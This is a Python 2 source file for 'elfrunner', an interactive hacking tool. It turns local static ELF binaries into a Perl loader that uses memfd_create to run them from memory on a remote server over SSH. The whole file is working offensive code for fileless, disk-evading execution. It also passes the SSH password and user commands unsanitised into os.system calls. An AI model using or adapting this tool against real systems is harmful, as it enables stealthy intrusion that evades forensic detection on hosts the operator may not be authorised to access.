#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▄████████  ▄█          ▄████████    ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█                    #
#███    ███ ███         ███    ███   ███    ███   ███    ███     ███    ███ ███       ███                   #
#███    █▀  ███         ███    █▀    ███    █▀    ███    ███     ███    █▀  ███       ███                   #
#▄███▄▄▄     ███        ▄███▄▄▄       ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███                  #
#▀▀███▀▀▀     ███       ▀▀███▀▀▀     ▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███                 #
#███    █▄  ███         ███                 ███   ███    ███     ███    █▄  ███       ███                   #
#███    ███ ███▌    ▄   ███           ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄             #
#██████████ █████▄▄██   ███         ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██             #
#▀                                                               ▀         ▀                                #
#                                                                                                           #
# elfrunner.py - nighter@nighter.se                                                                         #
#                                                                                                           #
# DATE                                                                                                      #
# 14/06/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Execute local elf binaries directly from memory on remote server by pipe them over SSH                    #
#                                                                                                           #
# Mikael Kall - nighter@nighter.se                                                                          #
#                                                                                                           #
#############################################################################################################

import random
import getpass
import paramiko
import signal
import time
import sys
import os

# Settings
STATIC_BINARIES='/home/mikkal/dev/HackingAllTheThings/tools/static/linux/x86_64'
ELFRUNNER='/usr/local/scripts/elfrunner.py'

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def create_perl_mem_payload():

    global BASEFILE
    global FILENAME
    global COMMAND

    if os.path.isfile('%s/%s' % (STATIC_BINARIES, BASEFILE)) is False:
        print("%s does not exists" % BASEFILE)
        return False

    payload_file = '%s/%s' % (STATIC_BINARIES, BASEFILE)
    perl_payload_file = '/tmp/%s.pl' % FILENAME

    payload = '''#!/usr/bin/env perl 
use warnings;
use strict;
$|=1;
my $name = "";
my $fd = syscall(319, $name, 1);
if (-1 == $fd) {
   die "memfd_create: $!"; 
}
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);
'''
    with open(perl_payload_file, 'w') as f:
        f.write(payload)

    command = '''perl -e '$/=\\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \\$!/;\\n"while(<>)' %s >> %s''' % (payload_file, perl_payload_file)
    os.system(command)

    script_name = str(COMMAND.split(' ')[0]).split('/')[-1]
    arguments = '","'.join(COMMAND.split(' ')[1:])
    arguments = script_name + '","' + arguments

    payload = '''exec {"/proc/$$/fd/$fd"} "%s" or die "exec: $!";''' % arguments

    with open(perl_payload_file, 'a') as f:
        f.write(payload)


def ssh_execute():

    create_perl_mem_payload()
    command = "sshpass -p %s ssh -p %s %s@%s perl < /tmp/%s.pl" % (PASSWORD, RPORT, USERNAME, RHOST, FILENAME)
    os.system(command)

def banner():
    print ("""
   ▄████████  ▄█          ▄████████    ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█       
  ███    ███ ███         ███    ███   ███    ███   ███    ███     ███    ███ ███       ███       
  ███    █▀  ███         ███    █▀    ███    █▀    ███    ███     ███    █▀  ███       ███       
 ▄███▄▄▄     ███        ▄███▄▄▄       ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███       
▀▀███▀▀▀     ███       ▀▀███▀▀▀     ▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███       
  ███    █▄  ███         ███                 ███   ███    ███     ███    █▄  ███       ███       
  ███    ███ ███▌    ▄   ███           ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄ 
  ██████████ █████▄▄██   ███         ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██ 
             ▀                                                               ▀         ▀         
  [nighter@nighter.se] -- Runs file in memory by pipe command over ssh.
""")

def options():
    global RHOST
    global RPORT
    global USERNAME
    global PASSWORD
    global STATIC_BINARIES

    print("RHOST: %s" % RHOST)
    print("RPORT: %s" % RPORT)
    print("USERNAME: %s" % USERNAME)

    if len(PASSWORD) > 2:
        print("PASSWORD: True")
    else:
        print("PASSWORD: False")

    print("")


def reset():
    os.system('clear')
    banner()
    options()

def interpreter():

    while True:

        global RHOST
        global RPORT
        global USERNAME
        global PASSWORD
        global FILENAME
        global STATIC_BINARIES
        global BASEFILE
        global COMMAND

        reset()

        result = raw_input("elfshell> ")
        if result == 'set':
            reset()
            RHOST = raw_input("RHOST> ")
            reset()
            RPORT = raw_input("RPORT> ")
            reset()
            USERNAME = raw_input("USERNAME> ")
            reset()
            PASSWORD = getpass.getpass('PASSWORD>')

        elif result.lower().startswith('set rhost'):

            try:
                reset()
                RHOST = result.split(' ')[2]
                reset()
            except:
                reset()
                RHOST = raw_input("RHOST> ")
                reset()

        elif result.lower().startswith('set username'):

            try:
                reset()
                USERNAME = result.split(' ')[2]
                reset()
            except:
                reset()
                USERNAME = raw_input("USERNAME> ")
                reset()

        elif result.lower().startswith('set rport'):

            try:
                reset()
                RPORT = result.split(' ')[2]
                reset()
            except:
                reset()
                RPORT = raw_input("RPORT> ")
                reset()

        elif result.lower().startswith('set password'):

            try:
                reset()
                PASSWORD = result.split(' ')[2]
                reset()
            except:
                reset()
                PASSWORD = getpass.getpass('PASSWORD>')
                reset()

        elif result.lower() == 'list' or result.lower() == 'l':
            os.system('clear')
            os.system('ls -1 %s' % STATIC_BINARIES)
            raw_input("")

        elif result.lower().startswith('run'):
            command = result[3:].strip()
            BASEFILE = command.split(' ')[0]

            COMMAND = '%s/%s' % (STATIC_BINARIES, command)
            ssh_execute()
            raw_input("")



if __name__ == '__main__':

    RHOST = ''
    RPORT = 22
    USERNAME = ''
    PASSWORD = ''
    BASEFILE = ''
    COMMAND = ''

    # Generate random number as filename
    FILENAME = str(random.random())[-1]

    interpreter()

